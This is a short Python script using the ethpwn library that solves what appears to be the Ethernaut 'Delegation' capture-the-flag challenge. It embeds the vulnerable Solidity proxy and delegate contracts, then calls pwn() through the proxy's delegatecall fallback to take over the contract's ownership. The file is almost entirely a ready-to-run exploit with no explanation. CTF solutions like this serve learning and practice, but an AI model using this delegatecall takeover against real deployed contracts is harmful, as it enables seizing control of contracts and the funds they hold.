#!/usr/bin/env python3

import sys
from ethpwn import *

INTERFACE = """
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
"""

context.log_level = 'DEBUG'

PROXY_ADDR, = sys.argv[1:]
CONTRACT_METADATA.compile_solidity_string(INTERFACE, '<stdin>')

delegation = CONTRACT_METADATA['Delegation'].get_contract_at(PROXY_ADDR)
delegate = CONTRACT_METADATA['Delegate'].get_contract_at(PROXY_ADDR)
transact(delegate.functions.pwn())